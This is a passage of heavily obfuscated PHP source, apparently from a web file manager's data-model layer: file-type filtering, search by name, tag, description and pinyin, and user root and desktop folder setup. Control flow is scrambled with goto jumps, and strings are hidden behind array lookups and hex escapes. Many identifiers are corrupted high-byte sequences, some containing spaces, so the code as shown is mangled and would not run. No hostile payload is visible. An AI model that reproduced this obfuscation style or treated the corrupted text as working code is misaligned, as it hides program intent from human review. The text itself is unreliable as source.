strtoupper(substr(PHP_OS, 0, 3)) == $EºÊÉÜÆÃ[1089]) { return !1; } $dÂ›½Ç¼á° = KodIO::parse($D˜ğĞñ§Ï“); goto FÛàÍš‘×ä; FÛàÍš‘×ä: if ($dÂ›½Ç¼á°[$EºÊÉÜÆÃ[29]] == KodIO::KOD_SOURCE) { $eö³­ŒàÚØ = Model($EºÊÉÜÆÃ[783])->fileInfoGet(KodIO::sourceID($D˜ğĞñ§Ï“)); if (!$eö³­ŒàÚØ[$EºÊÉÜÆÃ[76]]) { show_json($EºÊÉÜÆÃ[1090], !1); } $D˜ğĞñ§Ï“ = $eö³­ŒàÚØ[$EºÊÉÜÆÃ[76]]; } $aôÍßà¥¼ = self::init($D˜ğĞñ§Ï“); $D‚šß¬”Ã” = $aôÍßà¥¼->getType(); goto d¤ØšœÁÌ’; d¡Ã½é¦‰æ: } private static function archiveExt($bí„¡æéÓĞ = '') { $GLOBALS[$_SERVER[æ§›¦ÌáØ][1092]] = $bí„¡æéÓĞ; } } goto EŠÊÕŒŒ¼™; b­ğ¼è´ø: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($bÊßÒŠ¬êô) { goto FÁ•ÎÎøÖ²; D…ã«Ñï¼: if (!$A‡ÃÀËØÍ[$dŒ‰¯ô‹øƒ[168]]) { $b®¤ŸŞ´œª = array_to_keyvalue($e›ÜÌ²×Ş¦, $dŒ‰¯ô‹øƒ[33], $dŒ‰¯ô‹øƒ[168]); $F³Â‚Âñ·‘ = implode($dŒ‰¯ô‹øƒ[47], $b®¤ŸŞ´œª); $A¹ŠªàöÇÔ = $dŒ‰¯ô‹øƒ[1928]; } $Eİ£…õ©ÈŠ = explode($dŒ‰¯ô‹øƒ[47], trim($F³Â‚Âñ·‘, $dŒ‰¯ô‹øƒ[47])); return array($A¹ŠªàöÇÔ, $Eİ£…õ©ÈŠ); goto c¨â¼Ãô‹ù; FÁ•ÎÎøÖ²: $dŒ‰¯ô‹øƒ =& $_SERVER[æ§›¦ÌáØ]; $e›ÜÌ²×Ş¦ = KodIO::fileTypeList(); $A‡ÃÀËØÍ = $e›ÜÌ²×Ş¦[$bÊßÒŠ¬êô]; goto Bá¹ãŸì‰‰; Bá¹ãŸì‰‰: if (!$A‡ÃÀËØÍ) { return array(); } $F³Â‚Âñ·‘ = $A‡ÃÀËØÍ[$dŒ‰¯ô‹øƒ[168]]; $A¹ŠªàöÇÔ = $dŒ‰¯ô‹øƒ[7]; goto D…ã«Ñï¼; c¨â¼Ãô‹ù: } public function listPathType($c¡¯¨±“‘‰) { $BØ‡™µìÛË =& $_SERVER[æ§›¦ÌáØ]; $AÛô¾—ƒãŠ = $this->fileTypeWhere($c¡¯¨±“‘‰); if (!$AÛô¾—ƒãŠ) { return array(); } $FÓö¤†ßËã = array($BØ‡™µìÛË[562] => SourceModel::TYPE_USER, $BØ‡™µìÛË[563] => USER_ID, $BØ‡™µìÛË[559] => 0, $BØ‡™µìÛË[560] => $AÛô¾—ƒãŠ); return $this->listSource($FÓö¤†ßËã); } public function listSearch($eõĞ…šÕ°­, $FËôï¤ÃÄØ = 300) { goto CõØÈŒÎŞ„; EŞ¼³Ç¸­‰: $this->_listMake($e—ë·²©×Ñ); return $e—ë·²©×Ñ; goto fÆ´èŒŸ‹; e°õŠ¿²®: $this->_listSearchBindPinyin($eõĞ…šÕ°­, $b†‚ã°ñÎŞ, $D—®¿Ù§•ª); $this->alias($C…¿«©‡çë[529])->_makeOrder(); $b†‚ã°ñÎŞ = $this->parseWhereLike($b†‚ã°ñÎŞ); goto f§½»Â•; f§½»Â•: $e—ë·²©×Ñ = $this->distinct(!0)->field($D—®¿Ù§•ª)->where($b†‚ã°ñÎŞ)->selectPage($FËôï¤ÃÄØ); $this->_listSearchFileContent($e—ë·²©×Ñ, $eõĞ…šÕ°­, $FËôñª¹‚Ÿ); $this->_listSearchDesc($e—ë·²©×Ñ, $eõĞ…šÕ°­, $FËôñª¹‚Ÿ); goto DßÀ ‘ç•Ó; a‡îĞôç»˜: if (!isset($b†‚ã°ñÎŞ[$C…¿«©‡çë[423]])) { $b†‚ã°ñÎŞ[$C…¿«©‡çë[423]] = 0; } $D—®¿Ù§•ª = $C…¿«©‡çë[1930]; $FËôñª¹‚Ÿ = $D—®¿Ù§•ª; goto e°õŠ¿²®; DßÀ ‘ç•Ó: $this->_listSearchTag($e—ë·²©×Ñ, $eõĞ…šÕ°­, $FËôñª¹‚Ÿ); $this->_listSearchGroupTag($e—ë·²©×Ñ, $eõĞ…šÕ°­, $FËôñª¹‚Ÿ); $this->_listDataApply($e—ë·²©×Ñ[$C…¿«©‡çë[367]]); goto EŞ¼³Ç¸­‰; CõØÈŒÎŞ„: $C…¿«©‡çë =& $_SERVER[æ§›¦ÌáØ]; if (isset($eõĞ…šÕ°­[$C…¿«©‡çë[1772]]) && $eõĞ…šÕ°­[$C…¿«©‡çë[1772]]) { $eõĞ…šÕ°­[$C…¿«©‡çë[1772]] = str_replace($C…¿«©‡çë[381], $C…¿«©‡çë[1929], trim($eõĞ…šÕ°­[$C…¿«©‡çë[1772]])); } $b†‚ã°ñÎŞ = $this->_parseSearchWhere($eõĞ…šÕ°­); goto a‡îĞôç»˜; fÆ´èŒŸ‹: } private function _listSearchFileContent(&$bÔóÓÑìğ¹, $aö¶œòë÷, $eğÒ„¤ÀÎª) { goto eÚ¦ÃöºÃÏ; DÄê£‹ŞÑ™: unset($aö¶œòë÷[$dŸÑ¶‡ñ[447]]); $A‘÷¸Œ—Ş = $this->field($eğÒ„¤ÀÎª)->where($aœ«£¨ƒ´)->limit($dŸÑ¶‡ñ[1931])->select(); if (!$A‘÷¸Œ—Ş || count($A‘÷¸Œ—Ş) == 0) { return; } goto c·÷¥Î±£; f«Ûê„: if (!isset($aœ«£¨ƒ´[$dŸÑ¶‡ñ[28]]) || !is_array($aö¶œòë÷[$dŸÑ¶‡ñ[447]])) { return; } $aœ«£¨ƒ´[$dŸÑ¶‡ñ[447]] = array($dŸÑ¶‡ñ[7], $aö¶œòë÷[$dŸÑ¶‡ñ[447]]); unset($aœ«£¨ƒ´[$dŸÑ¶‡ñ[28]]); goto DÄê£‹ŞÑ™; eÚ¦ÃöºÃÏ: $dŸÑ¶‡ñ =& $_SERVER[æ§›¦ÌáØ]; if (!$aö¶œòë÷[$dŸÑ¶‡ñ[1772]] || $bÔóÓÑìğ¹[$dŸÑ¶‡ñ[364]][$dŸÑ¶‡ñ[351]] > 1) { return; } $aœ«£¨ƒ´ = $this->_parseSearchWhere($aö¶œòë÷); goto f«Ûê„; c·÷¥Î±£: $bÔóÓÑìğ¹[$dŸÑ¶‡ñ[367]] = array_merge($A‘÷¸Œ—Ş, $bÔóÓÑìğ¹[$dŸÑ¶‡ñ[367]]); $bÔóÓÑìğ¹[$dŸÑ¶‡ñ[364]][$dŸÑ¶‡ñ[365]] += count($A‘÷¸Œ—Ş); goto dï¬Ú³Áô×; dï¬Ú³Áô×: } private function _listSearchTag(&$fô¡‹»ïù, $CÛ‹•Š÷à, $eà÷Õå‰´¬) { goto F–Ïªßæ² ; bšÙá×¢’î: $D†£äÅ°Ò = array(); $C˜ÌãìÀŒ = $CÛ‹•Š÷à[$aïËò÷ğá•[1772]]; foreach ($C£È†ó·Î as $d¦˜Ô ‡¿) { $Eå‚ùÄ‡¾î = $d¦˜Ô ‡¿[$aïËò÷ğá•[28]]; $dÄÏï‘ØÒÎ = str_replace($aïËò÷ğá•[50], $aïËò÷ğá•[33], Pinyin::encode($Eå‚ùÄ‡¾î)); if (stripos($Eå‚ùÄ‡¾î, $C˜ÌãìÀŒ) !== !1 || stripos($dÄÏï‘ØÒÎ, $C˜ÌãìÀŒ) !== !1) { $D†£äÅ°Ò[] = $d¦˜Ô ‡¿[$aïËò÷ğá•[393]]; } } goto Dâ‚àğ¤÷à; B¤¦Á’ä³: $e¯ø©¹æ¢Ü = array_to_keyvalue($e¯ø©¹æ¢Ü, $aïËò÷ğá•[33], $aïËò÷ğá•[76]); $F¦ª“Ú¬« = array_unique($e¯ø©¹æ¢Ü); $this->_listSearchMerge($fô¡‹»ïù, $CÛ‹•Š÷à, $eà÷Õå‰´¬, $F¦ª“Ú¬«); goto fÀšòé‰¸; Dâ‚àğ¤÷à: if (!$D†£äÅ°Ò) { return; } $AÉš‹­« = array($aïËò÷ğá•[419] => array($aïËò÷ğá•[7], $D†£äÅ°Ò), $aïËò÷ğá•[1520] => USER_ID); $e¯ø©¹æ¢Ü = Model($aïËò÷ğá•[420])->field($aïËò÷ğá•[76])->where($AÉš‹­«)->select(); goto B¤¦Á’ä³; F–Ïªßæ² : $aïËò÷ğá• =& $_SERVER[æ§›¦ÌáØ]; if (!$CÛ‹•Š÷à[$aïËò÷ğá•[1772]] || $fô¡‹»ïù[$aïËò÷ğá•[364]][$aïËò÷ğá•[351]] > 1) { return; } $C£È†ó·Î = Model($aïËò÷ğá•[1932])->listData(); goto bšÙá×¢’î; fÀšòé‰¸: } private function _listSearchDesc(&$b ‘ÜõŞñ£, $bÖäã©òµ, $Dá·ã…Î¿Ò) { goto E¯™¬‘´; E¯™¬‘´: $b¬³ä‹ˆ³Ö =& $_SERVER[æ§›¦ÌáØ]; if (!$bÖäã©òµ[$b¬³ä‹ˆ³Ö[1772]] || $b ‘ÜõŞñ£[$b¬³ä‹ˆ³Ö[364]][$b¬³ä‹ˆ³Ö[351]] > 1) { return; } $f¶¬‰“ï£ = $this->listSearchChildren($bÖäã©òµ[$b¬³ä‹ˆ³Ö[478]]); goto BÏË¸Ñ„…; BÏË¸Ñ„…: $f¶¬‰“ï£ = array_unique($f¶¬‰“ï£); if (!$f¶¬‰“ï£) { return; } $CåèçßÒš— = array($b¬³ä‹ˆ³Ö[395] => array($b¬³ä‹ˆ³Ö[7], $f¶¬‰“ï£), $b¬³ä‹ˆ³Ö[93] => $b¬³ä‹ˆ³Ö[431], $b¬³ä‹ˆ³Ö[372] => array($b¬³ä‹ˆ³Ö[380], $b¬³ä‹ˆ³Ö[1774] . $bÖäã©òµ[$b¬³ä‹ˆ³Ö[1772]] . $b¬³ä‹ˆ³Ö[1774])); goto b…áİ®„±È; b…áİ®„±È: $B‹ŸÊ£‰ÚÔ = Model($b¬³ä‹ˆ³Ö[545])->field($b¬³ä‹ˆ³Ö[395])->where($CåèçßÒš—)->select(); $a¦ê¹´ñ–Œ = array_to_keyvalue($B‹ŸÊ£‰ÚÔ, $b¬³ä‹ˆ³Ö[33], $b¬³ä‹ˆ³Ö[395]); $this->_listSearchMerge($b ‘ÜõŞñ£, $bÖäã©òµ, $Dá·ã…Î¿Ò, $a¦ê¹´ñ–Œ); goto d—¦ƒó¦ğ; d—¦ƒó¦ğ: } private function _listSearchGroupTag(&$D‘¦Æ¼æ§, $f°ÄÔ–®¯ˆ, $Bî‚¿õª²°) { goto bëëƒòÄ£¸; dŒô‰ŠÏË£: if (!$a»…ß êå || $a»…ß êå[$F¡––Æ©Â¼[404]] != SourceModel::TYPE_GROUP) { return; } $Cƒë¬õÇò‰ = $a»…ß êå[$F¡––Æ©Â¼[484]]; $E®îÅÚÁæ÷ = Model($F¡––Æ©Â¼[1933])->get($Cƒë¬õÇò‰); goto FŸæß³Ôî; FŸæß³Ôî: $dæšßÌƒŸŸ = array(); $c¼®¬³ÛÔ = $f°ÄÔ–®¯ˆ[$F¡––Æ©Â¼[1772]]; foreach ($E®îÅÚÁæ÷[$F¡––Æ©Â¼[367]] as $bäÛ°ƒß¬ğ) { $D¿©ù ›ó½ = $bäÛ°ƒß¬ğ[$F¡––Æ©Â¼[28]]; $b‘‘“‡÷´ê = str_replace($F¡––Æ©Â¼[50], $F¡––Æ©Â¼[33], Pinyin::encode($D¿©ù ›ó½)); if (stripos($D¿©ù ›ó½, $c¼®¬³ÛÔ) !== !1 || stripos($b‘‘“‡÷´ê, $c¼®¬³ÛÔ) !== !1) { $dæšßÌƒŸŸ[] = $bäÛ°ƒß¬ğ[$F¡––Æ©Â¼[393]]; } } goto e£©‘·½Å; e£©‘·½Å: if (!$dæšßÌƒŸŸ) { return; } $a²Èí–Ä¹‰ = array($F¡––Æ©Â¼[419] => array($F¡––Æ©Â¼[7], $dæšßÌƒŸŸ), $F¡––Æ©Â¼[1520] => 0, $F¡––Æ©Â¼[29] => $F¡––Æ©Â¼[1796] . $Cƒë¬õÇò‰); $f‰“ÒÓ´‹¨ = Model($F¡––Æ©Â¼[420])->field($F¡––Æ©Â¼[76])->where($a²Èí–Ä¹‰)->select(); goto B‘çæÄƒŒ‚; bëëƒòÄ£¸: $F¡––Æ©Â¼ =& $_SERVER[æ§›¦ÌáØ]; if (!$f°ÄÔ–®¯ˆ[$F¡––Æ©Â¼[1772]] || $D‘¦Æ¼æ§[$F¡––Æ©Â¼[364]][$F¡––Æ©Â¼[351]] > 1 || !$f°ÄÔ–®¯ˆ[$F¡––Æ©Â¼[478]]) { return; } $a»…ß êå = $this->sourceInfo($f°ÄÔ–®¯ˆ[$F¡––Æ©Â¼[478]]); goto dŒô‰ŠÏË£; B‘çæÄƒŒ‚: $f‰“ÒÓ´‹¨ = array_to_keyvalue($f‰“ÒÓ´‹¨, $F¡––Æ©Â¼[33], $F¡––Æ©Â¼[76]); $d“Ş˜æÙ = array_unique($f‰“ÒÓ´‹¨); $this->_listSearchMerge($D‘¦Æ¼æ§, $f°ÄÔ–®¯ˆ, $Bî‚¿õª²°, $d“Ş˜æÙ); goto eª‹«Ï¯º‹; eª‹«Ï¯º‹: } private function _listSearchMerge(&$b–İÊŠÍ³Ì, $få§ÔóâŞ², $BÑïêŠšç, $Bïæí‡¸Ç³) { goto dÁÉ½…¨Ô²; F†¬ºÊ…Ò: foreach ($F­ìñ÷”´Ğ as $C´×äÄÇé„) { if ($this->_listSearchFilter($C´×äÄÇé„, $få§ÔóâŞ²)) { $d¾»íõ·±[] = $C´×äÄÇé„; } } $b–İÊŠÍ³Ì[$EÏ‰âÇİÚğ[367]] = array_merge($d¾»íõ·±, $b–İÊŠÍ³Ì[$EÏ‰âÇİÚğ[367]]); $b–İÊŠÍ³Ì[$EÏ‰âÇİÚğ[364]][$EÏ‰âÇİÚğ[365]] += count($d¾»íõ·±); goto dİÍÈù ˆ¥; e¸ÆŞ„ã¾—: $fòÕ¸Ã¦Œ« = array_diff($Bïæí‡¸Ç³, $bÎ‹››èè×); if (!$fòÕ¸Ã¦Œ«) { return; } $dÖí“Ã‘·› = array($EÏ‰âÇİÚğ[395] => array($EÏ‰âÇİÚğ[7], $fòÕ¸Ã¦Œ«)); goto E—Œƒºø¦ã; E—Œƒºø¦ã: $F­ìñ÷”´Ğ = $this->field($BÑïêŠšç)->where($dÖí“Ã‘·›)->select(); if (!$F­ìñ÷”´Ğ) { return; } $d¾»íõ·± = array(); goto F†¬ºÊ…Ò; dÁÉ½…¨Ô²: $EÏ‰âÇİÚğ =& $_SERVER[æ§›¦ÌáØ]; if (!$Bïæí‡¸Ç³) { return; } $bÎ‹››èè× = array_to_keyvalue($b–İÊŠÍ³Ì[$EÏ‰âÇİÚğ[367]], $EÏ‰âÇİÚğ[33], $EÏ‰âÇİÚğ[395]); goto e¸ÆŞ„ã¾—; dİÍÈù ˆ¥: } private function _listSearchFilter($fë²§‡„Œ“, $cª°ƒÇ¬®¨) { goto bƒÔÂ³ÅÈÆ; bƒÔÂ³ÅÈÆ: $BªÀÃŠ·­½ =& $_SERVER[æ§›¦ÌáØ]; $AŒÜ…ïÕÏ = $fë²§‡„Œ“[$BªÀÃŠ·­½[403]] == $BªÀÃŠ·­½[87]; if (!strstr($fë²§‡„Œ“[$BªÀÃŠ·­½[502]], $BªÀÃŠ·­½[47] . $cª°ƒÇ¬®¨[$BªÀÃŠ·­½[478]] . $BªÀÃŠ·­½[47])) { return !1; } goto bù†¢°¢êĞ; fÇŒè¯¿†: if (isset($cª°ƒÇ¬®¨[$BªÀÃŠ·­½[575]]) && $cª°ƒÇ¬®¨[$BªÀÃŠ·­½[575]] != $fë²§‡„Œ“[$BªÀÃŠ·­½[434]]) { return !1; } return !0; goto A¢‡’–ëÊ; bù†¢°¢êĞ: if (isset($cª°ƒÇ¬®¨[$BªÀÃŠ·­½[405]]) && $cª°ƒÇ¬®¨[$BªÀÃŠ·­½[405]] != $BªÀÃŠ·­½[1739]) { if ($cª°ƒÇ¬®¨[$BªÀÃŠ·­½[405]] == $BªÀÃŠ·­½[77] && !$AŒÜ…ïÕÏ) { return !1; } if ($cª°ƒÇ¬®¨[$BªÀÃŠ·­½[405]] != $BªÀÃŠ·­½[77] && $AŒÜ…ïÕÏ) { return !1; } if (!strstr($fë²§‡„Œ“[$BªÀÃŠ·­½[168]], $BªÀÃŠ·­½[47] . $cª°ƒÇ¬®¨[$BªÀÃŠ·­½[405]] . $BªÀÃŠ·­½[47])) { return !1; } } if (isset($cª°ƒÇ¬®¨[$BªÀÃŠ·­½[1934]]) && $cª°ƒÇ¬®¨[$BªÀÃŠ·­½[1934]] < $fë²§‡„Œ“[$BªÀÃŠ·­½[78]]) { return !1; } if (isset($cª°ƒÇ¬®¨[$BªÀÃŠ·­½[1935]]) && $cª°ƒÇ¬®¨[$BªÀÃŠ·­½[1935]] > $fë²§‡„Œ“[$BªÀÃŠ·­½[78]]) { return !1; } goto fÇŒè¯¿†; A¢‡’–ëÊ: } public function listSearchChildren($C¤ÄçŸãè¦, $b’¡½†ƒÛ§ = 5000) { goto a×Ü‡¡© ‚; a×Ü‡¡© ‚: $E˜Í•˜„¥± =& $_SERVER[æ§›¦ÌáØ]; $cÍğ‘”ø‡ç = array(); $DŠ¦Ú‚›åÊ = $this->sourceInfo($C¤ÄçŸãè¦); goto D„«øï†°©; D„«øï†°©: $c¬Ùö²à±ì = array($E˜Í•˜„¥±[502] => array($E˜Í•˜„¥±[380], $DŠ¦Ú‚›åÊ[$E˜Í•˜„¥±[502]] . $DŠ¦Ú‚›åÊ[$E˜Í•˜„¥±[395]] . $E˜Í•˜„¥±[526])); $dÃª¢ÙÀ‘ = $this->field($E˜Í•˜„¥±[395])->cache(null, 600)->where($c¬Ùö²à±ì)->count(); if ($dÃª¢ÙÀ‘ > $b’¡½†ƒÛ§) { return $this->_listSearchChildrenNear($C¤ÄçŸãè¦, $b’¡½†ƒÛ§); } goto d·´™ƒÉ‘¾; d·´™ƒÉ‘¾: $EôôâÉ„Ø¤ = $this->field($E˜Í•˜„¥±[395])->where($c¬Ùö²à±ì)->select(); $cÍğ‘”ø‡ç = array_to_keyvalue($EôôâÉ„Ø¤, $E˜Í•˜„¥±[33], $E˜Í•˜„¥±[395]); return $cÍğ‘”ø‡ç; goto FîêŒÍİö; FîêŒÍİö: } private function _listSearchChildrenNear($D×¢á‰‚óí, $eäÄ¬¯ÇÊ§) { goto AÔÛ¦­Ù†; AÔÛ¦­Ù†: $Bß¦×„Ã­ =& $_SERVER[æ§›¦ÌáØ]; $Aèˆ×èô¼ = array(); $cä×œÂœ‚ = array($Bß¦×„Ã­[478] => $D×¢á‰‚óí); goto e’ööç¬ìµ; e’ööç¬ìµ: $e–ƒà¦™‰õ = $this->field($Bß¦×„Ã­[1936])->where($cä×œÂœ‚)->select(); $C¶òÃÃ¬Í = array_to_keyvalue(array_filter_by_field($e–ƒà¦™‰õ, $Bß¦×„Ã­[403], $Bß¦×„Ã­[87]), $Bß¦×„Ã­[33], $Bß¦×„Ã­[395]); $Aèˆ×èô¼ = array_merge($Aèˆ×èô¼, array_to_keyvalue($e–ƒà¦™‰õ, $Bß¦×„Ã­[33], $Bß¦×„Ã­[395])); goto B£Ó‰ªğĞ†; b‹¼”Ë´©Á: $Aèˆ×èô¼ = array_merge($Aèˆ×èô¼, array_to_keyvalue($e–ƒà¦™‰õ, $Bß¦×„Ã­[33], $Bß¦×„Ã­[395])); $Aèˆ×èô¼ = array_slice($Aèˆ×èô¼, 0, $eäÄ¬¯ÇÊ§); return $Aèˆ×èô¼; goto f¿Çäåíµ«; B£Ó‰ªğĞ†: if (!$C¶òÃÃ¬Í) { return $Aèˆ×èô¼; } $cä×œÂœ‚ = array($Bß¦×„Ã­[478] => array($Bß¦×„Ã­[7], $C¶òÃÃ¬Í)); $e–ƒà¦™‰õ = $this->field($Bß¦×„Ã­[1936])->where($cä×œÂœ‚)->limit($eäÄ¬¯ÇÊ§)->select(); goto b‹¼”Ë´©Á; f¿Çäåíµ«: } private function _listSearchBindPinyin($c’ä½áßñ¨, &$bÛ ‡÷Ôº, &$E ºë˜à„) { goto C·Ùæ¥© ¸; d±À£­œ: $bÛ ‡÷Ôº = $aÇó‹’¥É†; goto aˆ°ôïíîˆ; a˜ªª–•àÚ: $E ºë˜à„ = $f§öÛÚä‚™[1938] . str_replace($f§öÛÚä‚™[47], $f§öÛÚä‚™[1939], $E ºë˜à„); $b£¦‹¦ÕĞ™ = $bÛ ‡÷Ôº[$f§öÛÚä‚™[28]]; unset($bÛ ‡÷Ôº[$f§öÛÚä‚™[28]]); goto cªçêÆÕÖ´; cªçêÆÕÖ´: foreach ($bÛ ‡÷Ôº as $CğŞÃœºë… => $DÂ—èï«) { $aÇó‹’¥É†[$f§öÛÚä‚™[1938] . $CğŞÃœºë…] = $DÂ—èï«; } foreach ($b£¦‹¦ÕĞ™ as $bø¿”‡á®Ö) { $aÇó‹’¥É†[] = array($f§öÛÚä‚™[1940] => $bø¿”‡á®Ö, $f§öÛÚä‚™[948] => $f§öÛÚä‚™[1776], array($f§öÛÚä‚™[1941] => $bø¿”‡á®Ö, $f§öÛÚä‚™[1942] => array($f§öÛÚä‚™[7], array($f§öÛÚä‚™[444], $f§öÛÚä‚™[443])))); } $this->join($B‘ÎóÇ„Ä); goto d±À£­œ; E‡ê‹ˆÃÖ¾: $B‘ÎóÇ„Ä = "\x4c\105\106\x54\40\112\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\163\157\165\162\x63\x65\x5f\x6d\x65\164\x61\x20\x6d\x65\164\141\x20\x6f\x6e\x20\163\x6f\x75\162\x63\145\56\x73\157\x75\x72\x63\x65\x49\x44\40\75\x20\x6d\x65\x74\x61\56\x73\157\x75\162\x63\145\111\104"; $aÇó‹’¥É† = array(); $E ºë˜à„ = str_replace(array($f§öÛÚä‚™[229], $f§öÛÚä‚™[50], $f§öÛÚä‚™[1937]), $f§öÛÚä‚™[33], $E ºë˜à„); goto a˜ªª–•àÚ; C·Ùæ¥© ¸: $f§öÛÚä‚™ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($c’ä½áßñ¨[$f§öÛÚä‚™[1772]]) || !$c’ä½áßñ¨[$f§öÛÚä‚™[1772]]) { return; } if (!Input::check($c’ä½áßñ¨[$f§öÛÚä‚™[1772]], $f§öÛÚä‚™[316]) || strlen($c’ä½áßñ¨[$f§öÛÚä‚™[1772]]) < 2) { return; } goto E‡ê‹ˆÃÖ¾; aˆ°ôïíîˆ: } private function _parseSearchWhere($aÃÁ°™Ê­Ğ) { goto bØ“ÔÆ±ÑÄ; DîÏòÉš•: if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1772]]) && trim($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1772]])) { $d˜İËîÏµ = trim($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1772]]); $F•Š³‹«İœ = explode($cµË‰›Â‘[50], $d˜İËîÏµ); if (strlen($d˜İËîÏµ) > 2 && (substr($d˜İËîÏµ, 0, 1) == $cµË‰›Â‘[116] && substr($d˜İËîÏµ, -1) == $cµË‰›Â‘[116]) || substr($d˜İËîÏµ, 0, 1) == $cµË‰›Â‘[55] && substr($d˜İËîÏµ, -1) == $cµË‰›Â‘[55]) { $d˜İËîÏµ = substr($d˜İËîÏµ, 1, -1); $F•Š³‹«İœ = array($d˜İËîÏµ); } $cãíÅ™Û[$cµË‰›Â‘[28]] = array(array($cµË‰›Â‘[525], $cµË‰›Â‘[1774] . $d˜İËîÏµ . $cµË‰›Â‘[1774])); if (count($F•Š³‹«İœ) > 1) { $cãíÅ™Û[$cµË‰›Â‘[28]] = array(); foreach ($F•Š³‹«İœ as $DÔÙˆŞ‡¬ó) { if (!trim($DÔÙˆŞ‡¬ó)) { continue; } $cãíÅ™Û[$cµË‰›Â‘[28]][] = array($cµË‰›Â‘[525], $cµË‰›Â‘[1774] . trim($DÔÙˆŞ‡¬ó) . $cµË‰›Â‘[1774]); } } } return $cãíÅ™Û; goto DÂ°™¢”; bØ“ÔÆ±ÑÄ: $cµË‰›Â‘ =& $_SERVER[æ§›¦ÌáØ]; $cãíÅ™Û = array(); if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[714]]) && $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[714]]) { $cãíÅ™Û[$cµË‰›Â‘[84]] = array($cµË‰›Â‘[1943], $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[714]]); } goto CÙ„´†ÛÈ›; b“œæô–ğ: if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[575]]) && $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[575]]) { $cãíÅ™Û[] = array($cµË‰›Â‘[434] => $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[575]], $cµË‰›Â‘[432] => $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[575]], $cµË‰›Â‘[948] => $cµË‰›Â‘[1776]); } if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[405]]) && $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[405]]) { $Cç¬Ç½‰˜¼ = $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[405]]; if ($Cç¬Ç½‰˜¼ == $cµË‰›Â‘[77]) { $cãíÅ™Û[$cµË‰›Â‘[403]] = 1; } else { if ($Cç¬Ç½‰˜¼ == $cµË‰›Â‘[1946]) { $cãíÅ™Û[$cµË‰›Â‘[403]] = 0; } else { if ($Cç¬Ç½‰˜¼) { $Cç¬Ç½‰˜¼ = is_array($Cç¬Ç½‰˜¼) ? $Cç¬Ç½‰˜¼ : explode($cµË‰›Â‘[47], $Cç¬Ç½‰˜¼); $cãíÅ™Û[$cµË‰›Â‘[405]] = array($cµË‰›Â‘[411], $Cç¬Ç½‰˜¼); $cãíÅ™Û[$cµË‰›Â‘[403]] = 0; } } } } if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[478]]) && $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[478]]) { $FÙÇ­µ…¤ = $this->sourceInfo($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[478]]); $cãíÅ™Û[$cµË‰›Â‘[566]] = array($cµË‰›Â‘[525], $FÙÇ­µ…¤[$cµË‰›Â‘[502]] . $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[478]] . $cµË‰›Â‘[526]); } goto DîÏòÉš•; CÙ„´†ÛÈ›: if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[476]]) && $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[476]]) { $a¤à¥ˆ ‚ = array($cµË‰›Â‘[1944], $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[476]]); if ($cãíÅ™Û[$cµË‰›Â‘[84]]) { $cãíÅ™Û[$cµË‰›Â‘[84]] = array($cãíÅ™Û[$cµË‰›Â‘[84]], $a¤à¥ˆ ‚, $cµË‰›Â‘[1945]); } else { $cãíÅ™Û[$cµË‰›Â‘[84]] = $a¤à¥ˆ ‚; } } if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1934]]) && $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1934]] > 0) { $cãíÅ™Û[$cµË‰›Â‘[78]] = array($cµË‰›Â‘[1943], $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1934]]); } if (isset($aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1935]]) && $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1935]]) { $a¤à¥ˆ ‚ = array($cµË‰›Â‘[1944], $aÃÁ°™Ê­Ğ[$cµË‰›Â‘[1935]]); if ($cãíÅ™Û[$cµË‰›Â‘[78]]) { $cãíÅ™Û[$cµË‰›Â‘[78]] = array($cãíÅ™Û[$cµË‰›Â‘[78]], $a¤à¥ˆ ‚, $cµË‰›Â‘[1945]); } else { $cãíÅ™Û[$cµË‰›Â‘[78]] = $a¤à¥ˆ ‚; } } goto b“œæô–ğ; DÂ°™¢”: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($eÛœâØÃ—è) { $aÍŠ´ñ²÷ =& $_SERVER[æ§›¦ÌáØ]; $BéÉ„šÀ•Ñ = Model($aÍŠ´ñ²÷[494])->where(array($aÍŠ´ñ²÷[1511] => $eÛœâØÃ—è))->find(); $fˆå ÈÛ– = $this->_mkdirRoot(SourceModel::TYPE_USER, $eÛœâØÃ—è, $BéÉ„šÀ•Ñ[$aÍŠ´ñ²÷[28]]); $this->userDesktopAdd($fˆå ÈÛ–); return $fˆå ÈÛ–; } public function userDesktopAdd($F¾Ôéì–‰¨) { $aìÁ¹ß­ÛÌ =& $_SERVER[æ§›¦ÌáØ]; $e‰Ó»ªµ›… = LNG($aìÁ¹ß­ÛÌ[1947]); $A„ÛÛë = $this->mkdir($F¾Ôéì–‰¨, $e‰Ó»ªµ›…); $this->metaSet($A„ÛÛë, $aìÁ¹ß­ÛÌ[1948], $aìÁ¹ß­ÛÌ[87]); $this->metaSet($F¾Ôéì–‰¨, $aìÁ¹ß­ÛÌ[1949], $A„ÛÛë); } public function groupRootAdd($FÚÂÃêÊùÕ) { $c¤¯ÃÄ×ñ´ =& $_SERVER[æ§›¦ÌáØ]; $dÆêØá›à­ = 